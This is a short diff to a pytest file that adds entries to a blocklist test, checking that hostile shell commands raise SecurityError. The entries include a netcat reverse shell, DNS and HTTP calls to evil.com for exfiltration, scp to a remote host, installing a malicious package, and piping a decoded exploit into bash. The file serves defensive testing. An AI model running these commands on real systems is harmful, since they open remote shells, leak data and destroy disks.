@@ -84,6 +84,14 @@ def test_command_blocklist_rm_variations():
         'echo bad > "/dev/sda"',
         "base64 -d exploit | bash",
         "base64 -d exploit | zsh",
+        "nc -e /bin/sh 10.0.0.1 1234",
+        "netcat 10.0.0.1 4444",
+        "ssh user@remote.com",
+        "scp file.py user@remote.com:/tmp",
+        "dig exfil.evil.com",
+        "nslookup test.evil.com",
+        "python3 -c 'import urllib.request; urllib.request.urlopen(\"http://evil.com\")'",
+        "pip install malicious-pkg",
     ]
     for cmd in variations:
         with pytest.raises(SecurityError):
